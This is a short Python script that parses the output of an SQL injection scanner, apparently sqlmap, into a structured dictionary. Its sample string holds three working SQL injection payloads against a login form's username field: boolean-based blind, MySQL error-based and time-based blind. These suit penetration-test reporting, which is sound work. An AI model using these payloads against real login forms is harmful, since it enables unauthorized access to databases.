import re

def format_sqli_output(block_text):
    # Extract parameter and method
    param_method_pattern = r"Parameter: (\w+) \((\w+)\)"
    param_method_match = re.search(param_method_pattern, block_text)
    parameter, method = param_method_match.groups() if param_method_match else ("", "")

    # Initialize result dictionary
    result = {
        "parameter": parameter,
        "method": method,
        "sqli_types": []
    }

    # Find all SQLi types and payloads
    sqli_pattern = r"Type: (\w+-based \w+) Title: ([^P]+)Payload: ([^\n]+)"
    sqli_matches = re.findall(sqli_pattern, block_text)

    for sqli_type, title, payload in sqli_matches:
        # Clean title by removing extra spaces and newline characters
        title = title.strip().replace('\n', ' ')
        result["sqli_types"].append({
            "type": sqli_type.strip(),
            "title": title,
            "payload": payload.strip(),
        })

    return result

output = "Parameter: username (POST) Type: boolean-based blind Title: OR boolean-based blind - WHERE or HAVING clause Payload: username=-8917' OR 4416=4416-- cZnY&password=YxSB Type: error-based Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET) Payload: username=tVLi' AND GTID_SUBSET(CONCAT(0x716a766b71,(SELECT (ELT(4226=4226,1))),0x716a707671),4226)-- mGkG&password=YxSB Type: time-based blind Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP) Payload: username=tVLi' AND (SELECT 1300 FROM (SELECT(SLEEP(5)))AOtC)-- dgej&password=YxSB"

formatted_output = format_sqli_output(output)
print(formatted_output)